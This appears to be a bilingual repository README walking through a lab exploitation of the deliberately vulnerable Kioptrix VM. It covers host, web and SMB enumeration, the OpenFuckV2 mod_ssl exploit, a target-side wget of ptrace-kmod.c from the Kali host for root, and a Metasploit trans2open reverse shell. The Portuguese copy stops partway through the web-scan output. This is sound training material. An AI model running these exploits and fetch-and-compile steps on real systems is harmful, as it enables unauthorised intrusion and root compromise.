# Kioptrix Vulnerability Exploration

## Overview
This repository documents the analysis and exploitation of the **Kioptrix** vulnerable virtual machine. It covers host discovery, service and web enumeration, the Apache mod_ssl exploit with local privilege escalation, and the Samba Trans2Open buffer overflow. The walkthrough follows the order of the two vulnerabilities in the exploitation flow: CVE-2002-0082 first, followed by CVE-2003-0201.

## Environment
- **Host (Kali):** Kali GNU/Linux Rolling 2026.2 (kali-rolling)
- **Target (Kioptrix):** Linux 2.4.X (kernel 2.4.9 - 2.4.18, likely embedded; `cpe:/o:linux:linux_kernel:2.4`)
- **Virtualization:** Oracle VirtualBox 7.2.20 (GUI 7.2.20 r175154)

## Tools & Techniques
| Tool | Purpose |
| --- | --- |
| `netdiscover` | ARP discovery of the target on the host-only network. |
| `nmap` (`-sC -sV -p-`, `-O`, `http-enum`) | Port/service/version detection, OS fingerprinting and web path enumeration. |
| `gobuster` | Directory brute-forcing against port 80. |
| Metasploit `smb_version`, `enum4linux`, `smbclient` | SMB version detection, share/user enumeration and anonymous access checks. |
| `searchsploit` + `gcc` | Locating, extracting and compiling the Apache mod_ssl exploit. |
| `wget` + `python3 -m http.server` + `gcc` | Transferring and compiling `ptrace-kmod.c` to escalate from `apache` to `root`. |
| Metasploit `exploit/linux/samba/trans2open` | Samba Trans2Open buffer overflow with a reverse shell. |

## Target Information
- **IP address:** The `netdiscover` sweep listed two hosts on `192.168.56.0/24`; the Kioptrix target is `192.168.56.106` (MAC `08:00:27:80:D8:F4`).
- **OS details:** `cpe:/o:linux:linux_kernel:2.4` - Linux 2.4.9 - 2.4.18 (likely embedded).
- **Services detected:** SSH on 22 (OpenSSH 2.9p2, SSHv1), HTTP/HTTPS on 80/443 (Apache 1.3.20, mod_ssl 2.8.4, OpenSSL 0.9.6b), rpcbind on 111, Samba smbd on 139 (workgroup `MYGROUP`) and status on 32768.
- **SMB:** anonymous access to `IPC$` succeeded; `ADMIN$` returned `NT_STATUS_WRONG_PASSWORD`. The `smb_version` module reported a Unix host with SMB signing not required but did not return an exact version (the `versions` field was empty); based on the context and the Trans2Open target, Samba is in the **2.2.x** range.

Key discovery and fingerprinting results:

```bash
$ sudo netdiscover -r 192.168.56.0/24

 Currently scanning: Finished!   |   Screen View: Unique Hosts
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.100  08:00:27:4c:f8:fe      1      60  PCS Systemtechnik GmbH
 192.168.56.106  08:00:27:80:d8:f4      1      60  PCS Systemtechnik GmbH

$ nmap -sC -sV -p- 192.168.56.106
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-23 16:37 -0300
Nmap scan report for 192.168.56.106
Host is up (0.00014s latency).
Not shown: 65529 closed tcp ports (reset).
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey:
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1          32768/tcp   status
|_  100024  1          32768/udp   status
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
...
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
| sslv2:
|   SSLv2 supported
...
32768/tcp open  status      1 (RPC #100024)
MAC Address: 08:00:27:80:D8:F4 (Oracle VirtualBox virtual NIC)

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: -1d09h56m06s

Nmap done: 1 IP address (1 host up) scanned in 19.65 seconds

$ nmap -O 192.168.56.106
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-23 16:36 -0300
Nmap scan report for 192.168.56.106
Host is up (0.00039s latency).
Not shown: 994 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
443/tcp   open  https
32768/tcp open  filenet-tms
MAC Address: 08:00:27:80:D8:F4 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Network Distance: 1 hop

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.37 seconds
```

## Web Scan
- `/test.php` opens normally.
- `/icons` returns *Not Found*.
- Other discovered paths (`/manual`, `/mrtg`, `/usage`, `/cgi-bin` and dotfiles) either redirect to `127.0.0.1` or could not be accessed.
- The service/version scan reported `Apache/1.3.20` with `mod_ssl/2.8.4` and `OpenSSL/0.9.6b`; the web path enumeration only confirmed which paths exist.

Representative web enumeration results:

```bash
$ gobuster dir -u http://192.168.56.106 -w /usr/share/wordlists/dirb/common.txt -t 30
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.106
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 403) [Size: 273]
.hta                 (Status: 403) [Size: 268]
.htpasswd            (Status: 403) [Size: 273]
~root                (Status: 403) [Size: 269]
~operator            (Status: 403) [Size: 273]
cgi-bin/             (Status: 403) [Size: 272]
index.html           (Status: 200) [Size: 2890]
manual               (Status: 301) [Size: 294] [--> http://127.0.0.1/manual/]
mrtg                 (Status: 301) [Size: 292] [--> http://127.0.0.1/mrtg/]
usage                (Status: 301) [Size: 293] [--> http://127.0.0.1/usage/]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================

$ nmap --script http-enum -p 80,443 192.168.56.106
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-24 17:57 -0300
Nmap scan report for 192.168.56.106
Host is up (0.00048s latency).

PORT    STATE SERVICE
80/tcp  open  http
| http-enum:
|   /test.php: Test page
|   /icons/: Potentially interesting directory w/ listing on 'apache/1.3.20'
|   /manual/: Potentially interesting directory w/ listing on 'apache/1.3.20'
|_  /usage/: Potentially interesting folder
443/tcp open  https
MAC Address: 08:00:27:80:D8:F4 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 21.42 seconds
```

Screenshot evidence:

- ![Test page (`/test.php`)](images/page-test.php.png)
- ![Icons not found (`/icons`)](images/page-icons.png)
- ![Manual page (`/manual`)](images/page-manual.png)

## SMB Enumeration
Anonymous enumeration results:

```bash
$ Metasploit auxiliary/scanner/smb/smb_version (RHOSTS 192.168.56.106, RPORT 139)
msf > search smb_version
...
msf > use auxiliary/scanner/smb/smb_version
msf auxiliary(scanner/smb/smb_version) > set rhosts 192.168.56.106
rhosts => 192.168.56.106
msf auxiliary(scanner/smb/smb_version) > set rport 139
rport => 139
msf auxiliary(scanner/smb/smb_version) > run
...
[*] 192.168.56.106:139 - SMB Detected (versions: ) (preferred dialect: ) (signatures: optional)
[+] 192.168.56.106:139 - Host is running Unix
[*] 192.168.56.106:139 - SMB signing is not required
[*] 192.168.56.106 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

$ enum4linux -a 192.168.56.106
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Nov 23 16:45:35 2026

 =========================================( Target Information )=========================================
Target ........... 192.168.56.106
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ===========================( Enumerating Workgroup/Domain on 192.168.56.106 )===========================
[+] Got domain/workgroup name: MYGROUP

 ===============================( Nbtstat Information for 192.168.56.106 )===============================
...
        KIOPTRIX        <00> -         B <ACTIVE>  Workstation Service
        KIOPTRIX        <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        MYGROUP         <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name

 ==================================( Session Check on 192.168.56.106 )==================================
[+] Server 192.168.56.106 allows sessions using username '', password ''

 =======================================( Getting domain SID ... )=======================================
...
 ==================================( OS information on 192.168.56.106 )==================================
[+] Got OS info for 192.168.56.106 from srvinfo:
        KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server
        platform_id     :       500
        os version      :       4.5
        server type     :       0x9a03

 ======================================( Users on 192.168.56.106 )======================================

 ================================( Share Enumeration on 192.168.56.106 )================================
        Sharename       Type      Comment
        ---------       ----      -------
        IPC$            IPC       IPC Service (Samba Server)
        ADMIN$          IPC       IPC Service (Samba Server)
...
//192.168.56.106/IPC$   Mapping: N/A Listing: N/A Writing: N/A
...
//192.168.56.106/ADMIN$ Mapping: N/A Listing: N/A Writing: N/A

 ===========================( Password Policy Information ... )========================================
[+] Retieved partial password policy with rpcclient:
Password Complexity: Disabled
Minimum Password Length: 0

 =======================================( Groups on 192.168.56.106 )======================================
...
group:[Administrators] rid:[0x220]
...
[+]  Getting local groups:
group:[sys] rid:[0x3ef]
...

 =================( Users on 192.168.56.106 via RID cycling (RIDS: 500-550,1000-1050) )=================
...
S-1-5-21-4157223341-3243572438-1405127623-1000 KIOPTRIX\root (Local User)
...
S-1-5-21-4157223341-3243572438-1405127623-1050 KIOPTRIX\unix_user.25 (Local User)

 ==============================( Getting printer info for 192.168.56.106 )==============================
No printers returned.

enum4linux complete on Mon Nov 23 16:45:42 2026

$ smbclient -L //192.168.56.106/ -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        IPC$            IPC       IPC Service (Samba Server)
        ADMIN$          IPC       IPC Service (Samba Server)
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------
        KIOPTRIX             Samba Server

        Workgroup            Master
        ---------            -------
        MYGROUP              KIOPTRIX

$ smbclient //192.168.56.106/IPC$ -N
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> help
...
smb: \>

$ smbclient //192.168.56.106/ADMIN$ -N
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful
tree connect failed: NT_STATUS_WRONG_PASSWORD
```

## Exploitation Flow
1. **Apache mod_ssl - CVE-2002-0082 (remote code execution + privilege escalation).** `searchsploit` located the OpenFuckV2 exploit; it was compiled and run with the Red Hat 7.2 / Apache 1.3.20 offset (`0x6b`) against port 443, yielding a shell as `apache`. The `ptrace-kmod.c` kernel exploit was then downloaded from the Kali host, compiled and executed to obtain `root`. Reference: https://medium.com/@mahmoudelshorpagy7/kioptrix-l-writeup-apache-mod-ssl-exploitation-openfuckv2-ce5efcb893dd

   The `-c 40` exploit run and the HTTP server that serves `ptrace-kmod.c` must be started in **separate terminals on Kali**. The commands after `Spawning shell...` run inside the target shell obtained by the exploit.

   Key excerpts:

   ```bash
   $ searchsploit apache mod_ssl
   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
    Exploit Title                                                                                                                                                                                            |  Path
   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
   Apache mod_ssl 2.0.x - Remote Denial of Service                                                                                                                                                           | linux/dos/24590.txt
   Apache mod_ssl 2.8.x - Off-by-One HTAccess Buffer Overflow                                                                                                                                                | multiple/dos/21575.txt
   Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                                                                                                                      | unix/remote/21671.c
   Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                                                                                                                | unix/remote/764.c
   Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                                                                                                                | unix/remote/47080.c
   Apache mod_ssl OpenSSL < 0.9.6d / < 0.9.7-beta2 - 'openssl-too-open.c' SSL2 KEY_ARG Overflow                                                                                                              | unix/remote/40347.txt
   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
   Shellcodes: No Results

   $ searchsploit -m 47080.c
   Exploit: Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)
       URL: https://www.exploit-db.com/exploits/47080
       Path: /usr/share/exploitdb/exploits/unix/remote/47080.c
   Codes: CVE-2002-0082, OSVDB-857
   Verified: False
   File Type: C source, ASCII text
   Copied to: /home/kali/Documents/kioptrix/47080.c

   $ gcc 47080.c -o OpenFuck -lcrypto -lssl
   47080.c: In function ‘read_ssl_packet’:
   47080.c:534:17: warning: ‘RC4’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
   ...
   47080.c: In function ‘send_client_master_key’:
   ...
   47080.c: In function ‘generate_key_material’:
   ...
   47080.c: In function ‘generate_session_keys’:
   ...

   $ ./OpenFuck
   *********************************************************************
   * OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
   *********************************************************************
   ...
   : Usage: ./openfuck target box [port] [-c N]

     target - supported box eg: 0x00
     box - hostname or IP address
     port - port for ssl connection
     -c open N connections. (use range 40-50 if u dont know)

     Supported OffSet:
           0x00 - Caldera OpenLinux (apache-1.3.26)
   ...
           0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
           0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
   ...
           0x8a - Yellow Dog Linux/PPC 2.3 (apache-1.3.22-6.2.3a)

   $ ./OpenFuck 0x6b 192.168.56.106 443
   *********************************************************************
   * OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
   ...
   Establishing SSL connection
   cipher: 0x4043808c   ciphers: 0x80f8050
   Ready to send shellcode
   Spawning shell...
   bash: no job control in this shell
   bash-2.05$
   d.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo
   --20:17:26--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
              => `ptrace-kmod.c'
   Connecting to dl.packetstormsecurity.net:443...
   dl.packetstormsecurity.net: Host not found.
   gcc: ptrace-kmod.c: No such file or directory
   gcc: No input files
   rm: cannot remove `ptrace-kmod.c': No such file or directory
   bash: ./exploit: No such file or directory
   bash-2.05$ pwd
   pwd
   /tmp
   bash-2.05$ id
   id
   uid=48(apache) gid=48(apache) groups=48(apache)
   bash-2.05$ whoami
   whoami
   apache
   bash-2.05$

   # Terminal 1 (Kali) - download the source, then keep this server running
   $ wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
   --2026-11-24 17:20:57--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
   Resolving dl.packetstormsecurity.net (dl.packetstormsecurity.net)... 64.71.185.201
   Connecting to dl.packetstormsecurity.net|64.71.185.201|:443... connected.
   HTTP request sent, awaiting response... 200 OK
   Length: 3921 (3.8K) [text/x-csrc]
   Saving to: ‘ptrace-kmod.c’

   ptrace-kmod.c                                              100%[========================================================================>]   3.83K  --.-KB/s    in 0s

   2026-11-24 17:20:58 (141 MB/s) - ‘ptrace-kmod.c’ saved [3921/3921]

   $ python3 -m http.server 8080
   Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
   192.168.56.106 - - [24/Nov/2026 17:24:54] "GET /ptrace-kmod.c HTTP/1.0" 200 -
   ```

   Terminal 2 (Kali) - start the exploit in another terminal while Terminal 1 keeps serving the file:

   ```bash
   $ ./OpenFuck 0x6b 192.168.56.106 443 -c 40
   ...
   Connection... 40 of 40
   Establishing SSL connection
   ...
   Spawning shell...
   bash: no job control in this shell
   bash-2.05$
   ```

   Shell on the target (inside the Terminal 2 session):

   ```bash
   bash-2.05$ wget http://192.168.56.102:8080/ptrace-kmod.c
   ...
   20:24:53 (3.74 MB/s) - `ptrace-kmod.c' saved [3921/3921]
   bash-2.05$ ls -la
   ...
   -rw-r--r--    1 apache   apache       3921 Apr  1  2003 ptrace-kmod.c
   bash-2.05$ gcc ptrace-kmod.c -o privesc
   bash-2.05$ ./privesc
   [+] Attached to 1110
   [+] Waiting for signal
   [+] Signal caught
   [+] Shellcode placed at 0x4001189d
   [+] Now wait for suid shell...
   whoami
   root
   id
   uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
   ...
   ```

2. **Samba Trans2Open - CVE-2003-0201 (buffer overflow).** The Metasploit module `exploit/linux/samba/trans2open` was configured with `RHOSTS 192.168.56.106`, `RPORT 139`, payload `generic/shell_reverse_tcp` and `LHOST 192.168.56.102`; it returned a `root` shell. Reference: https://github.com/ruslaniha/Kioptrix-CTF-Project

   All commands below run in a single `msfconsole` terminal; Metasploit starts the reverse handler itself, so no second terminal is needed.

   Key excerpts:

   ```bash
   $ msfconsole
   msf > search trans2open

   Matching Modules
   ================

      #  Full Name                                                    Disclosure Date  Rank   Check  Name
      -  ---------                                                    ---------------  ----   -----  ----
      0  exploit/freebsd/samba/trans2open                             2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
      1  exploit/linux/samba/trans2open                               2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
      2  exploit/osx/samba/trans2open                                 2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
      3  exploit/solaris/samba/trans2open                             2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)
      4    \_ target: Samba 2.2.x - Solaris 9 (sun4u) - Bruteforce    .                .      .      .
      5    \_ target: Samba 2.2.x - Solaris 7/8 (sun4u) - Bruteforce  .                .      .      .

   msf > use exploit/linux/samba/trans2open
   [*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
   msf exploit(linux/samba/trans2open) > show options
   ...
   Module options (exploit/linux/samba/trans2open):
      Name    Current Setting  Required  Description
      ----    ---------------  --------  -----------
      RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
      RPORT   139              yes       The target port (TCP)

   Payload options (linux/x86/meterpreter/reverse_tcp):
      Name   Current Setting  Required  Description
      ----   ---------------  --------  -----------
      LHOST  10.0.3.15        yes       The listen address (an interface may be specified)
      LPORT  4444             yes       The listen port

   Exploit target:
      Id  Name
      --  ----
      0   Samba 2.2.x - Bruteforce

   msf exploit(linux/samba/trans2open) > set PAYLOAD generic/shell_reverse_tcp
   PAYLOAD => generic/shell_reverse_tcp
   msf exploit(linux/samba/trans2open) > set RHOSTS 192.168.56.106
   RHOSTS => 192.168.56.106
   msf exploit(linux/samba/trans2open) > set LHOSTS 192.168.56.102
   [!] Unknown datastore option: LHOSTS. Did you mean LHOST?
   LHOSTS => 192.168.56.102
   msf exploit(linux/samba/trans2open) > set LHOST 192.168.56.102
   LHOST => 192.168.56.102
   msf exploit(linux/samba/trans2open) > exploit

   [*] Started reverse TCP handler on 192.168.56.102:4444
   [*] 192.168.56.106:139 - Trying return address 0xbffffdfc...
   ...
   [*] 192.168.56.106:139 - Trying return address 0xbffff6fc...
   [*] Command shell session 1 opened (192.168.56.102:4444 -> 192.168.56.106:32770) at 2026-11-24 18:32:06 -0300
   [*] Command shell session 2 opened (192.168.56.102:4444 -> 192.168.56.106:32771) at 2026-11-24 18:32:07 -0300
   ...
   id
   uid=0(root) gid=0(root) groups=99(nobody)
   whoami
   root
   pwd
   /tmp
   cd /root
   ls -la
   ...
   drwxr-x---    2 root     root         4096 Sep 26  2009 .
   ...
   -rw-r--r--    1 root     root         1303 Sep 26  2009 anaconda-ks.cfg
   ```

## Reproducing the Walkthrough
- **Discover the target** with `netdiscover` on the host-only network and identify the Kioptrix host.
- **Fingerprint the host** with `nmap -sC -sV -p-` and `nmap -O`; record open ports, versions and OS.
- **Enumerate web paths** on ports 80/443 with `gobuster` and the `http-enum` script; capture the screenshots stored in `images/`.
- **Enumerate SMB** with the Metasploit SMB version module, `enum4linux` and `smbclient`; note the anonymous `IPC$` access and the `ADMIN$` failure.
- **Exploit Apache mod_ssl**, then escalate from `apache` to `root` with `ptrace-kmod.c`.
- **Exploit Samba Trans2Open** against port 139 to get a reverse root shell.
- **Document** each step and keep the screenshots in `images/`.

## References
- CVE-2002-0082 (Apache mod_ssl): https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082
- CVE-2003-0201 (Samba Trans2Open): https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0201
- Kioptrix L write-up (Medium): https://medium.com/@mahmoudelshorpagy7/kioptrix-l-writeup-apache-mod-ssl-exploitation-openfuckv2-ce5efcb893dd
- Kioptrix CTF project (GitHub): https://github.com/ruslaniha/Kioptrix-CTF-Project

---

## Versão em Português (pt-BR)

### Visão geral
Este repositório documenta a análise e a exploração da máquina virtual vulnerável **Kioptrix**. Abrange a descoberta do host, a enumeração de serviços e de caminhos web, o exploit Apache mod_ssl com escalada local de privilégios e o overflow de buffer Samba Trans2Open. O passo a passo segue a ordem das duas vulnerabilidades no fluxo de exploração: CVE-2002-0082 primeiro, seguido de CVE-2003-0201. 

### Ambiente
- **Host (Kali):** Kali GNU/Linux Rolling 2026.2 (kali-rolling)
- **Alvo (Kioptrix):** Linux 2.4.X (kernel 2.4.9 - 2.4.18, provavelmente embarcado; `cpe:/o:linux:linux_kernel:2.4`)
- **Virtualização:** Oracle VirtualBox 7.2.20 (GUI 7.2.20 r175154)

### Ferramentas & Técnicas
| Ferramenta | Finalidade |
| --- | --- |
| `netdiscover` | Descoberta do alvo por ARP na rede host-only. |
| `nmap` (`-sC -sV -p-`, `-O`, `http-enum`) | Detecção de portas/serviços/versões, fingerprint de SO e enumeração de caminhos web. |
| `gobuster` | Força bruta de diretórios na porta 80. |
| Módulo `smb_version` do Metasploit, `enum4linux`, `smbclient` | Detecção da versão SMB, enumeração de compartilhamentos/usuários e testes de acesso anônimo. |
| `searchsploit` + `gcc` | Localização, extração e compilação do exploit Apache mod_ssl. |
| `wget` + `python3 -m http.server` + `gcc` | Transferência e compilação de `ptrace-kmod.c` para escalar de `apache` para `root`. |
| `exploit/linux/samba/trans2open` do Metasploit | Overflow de buffer Samba Trans2Open com shell reversa. |

### Informações do Alvo
- **Endereço IP:** A varredura com `netdiscover` listou dois hosts em `192.168.56.0/24`; o alvo Kioptrix é `192.168.56.106` (MAC `08:00:27:80:D8:F4`).
- **Detalhes do SO:** `cpe:/o:linux:linux_kernel:2.4` - Linux 2.4.9 - 2.4.18 (provavelmente embarcado).
- **Serviços detectados:** SSH na porta 22 (OpenSSH 2.9p2, SSHv1), HTTP/HTTPS nas portas 80/443 (Apache 1.3.20, mod_ssl 2.8.4, OpenSSL 0.9.6b), rpcbind na 111, Samba smbd na 139 (workgroup `MYGROUP`) e status na 32768.
- **SMB:** o acesso anônimo a `IPC$` funcionou; `ADMIN$` retornou `NT_STATUS_WRONG_PASSWORD`. O módulo `smb_version` reportou um host Unix com assinatura SMB não obrigatória, mas não retornou uma versão exata (o campo `versions` veio vazio); pelo contexto e pelo alvo do Trans2Open, o Samba está na faixa **2.2.x**.

Principais resultados de descoberta e fingerprint:

```bash
$ sudo netdiscover -r 192.168.56.0/24

 Currently scanning: Finished!   |   Screen View: Unique Hosts
 2 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 120
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.56.100  08:00:27:4c:f8:fe      1      60  PCS Systemtechnik GmbH
 192.168.56.106  08:00:27:80:d8:f4      1      60  PCS Systemtechnik GmbH

$ nmap -sC -sV -p- 192.168.56.106
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-23 16:37 -0300
Nmap scan report for 192.168.56.106
Host is up (0.00014s latency).
Not shown: 65529 closed tcp ports (reset).
PORT      STATE SERVICE     VERSION
22/tcp    open  ssh         OpenSSH 2.9p2 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey:
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
80/tcp    open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
111/tcp   open  rpcbind     2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|   100000  2            111/udp   rpcbind
|   100024  1          32768/tcp   status
|_  100024  1          32768/udp   status
139/tcp   open  netbios-ssn Samba smbd (workgroup: MYGROUP)
443/tcp   open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
...
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-09-26T09:32:06
|_Not valid after:  2010-09-26T09:32:06
| sslv2:
|   SSLv2 supported
...
32768/tcp open  status      1 (RPC #100024)
MAC Address: 08:00:27:80:D8:F4 (Oracle VirtualBox virtual NIC)

Host script results:
|_smb2-time: Protocol negotiation failed (SMB2)
|_nbstat: NetBIOS name: KIOPTRIX, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
|_clock-skew: -1d09h56m06s

Nmap done: 1 IP address (1 host up) scanned in 19.65 seconds

$ nmap -O 192.168.56.106
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-23 16:36 -0300
Nmap scan report for 192.168.56.106
Host is up (0.00039s latency).
Not shown: 994 closed tcp ports (reset)
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
443/tcp   open  https
32768/tcp open  filenet-tms
MAC Address: 08:00:27:80:D8:F4 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.4.X
OS CPE: cpe:/o:linux:linux_kernel:2.4
OS details: Linux 2.4.9 - 2.4.18 (likely embedded)
Network Distance: 1 hop

OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.37 seconds
```

### Varredura Web
- A página `/test.php` abre normalmente.
- `/icons` retorna *Not Found*.
- Os demais caminhos encontrados (`/manual`, `/mrtg`, `/usage`, `/cgi-bin` e arquivos ocultos) ou redirecionam para `127.0.0.1` ou não puderam ser acessados.
- A varredura de serviços/versões reportou `Apache/1.3.20` com `mod_ssl/2.8.4` e `OpenSSL/0.9.6b`; a enumeração de caminhos web apenas confirmou quais caminhos existem.

Resultados representativos da enumeração web:

```bash
$ gobuster dir -u http://192.168.56.106 -w /usr/share/wordlists/dirb/common.txt -t 30
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.106
[+] Method:                  GET
[+] Threads:                 30
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
.htaccess            (Status: 403) [Size: 273]
.hta                 (Status: 403) [Size: 268]
.htpasswd            (Status: 403) [Size: 273]
~root                (Status: 403) [Size: 269]
~operator            (Status: 403) [Size: 273]
cgi-bin/             (Status: 403) [Size: 272]
index.html           (Status: 200) [Size: 2890]
manual               (Status: 301) [Size: 294] [--> http://127.0.0.1/manual/]
mrtg                 (Status: 301) [Size: 292] [--> http://127.0.0.1/mrtg/]
usage                (Status: 301) [Size: 293] [--> http://127.0.0.1/usage/]
Progress: 4613 / 4613 (100.00%)
===============================================================
Finished
===============================================================

$ nmap --script http-enum -p 80,443 192.168.56.106
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-24 17:57 -0300
Nmap scan report for 192.168.56.106
Host is up (0.00048s latency).

PORT    STATE SERVICE
80/tcp  open  http
| http-enum:
|   /test.php: Test page
|   /icons/: Potentially interesting directory w/ listing on 'apache/1.3.20'
|   /manual/: Potentially interesting directory w/ listing on 'apache/1.3.20'
|_  /usage/: Potentially interesting folder
443/tcp open  https
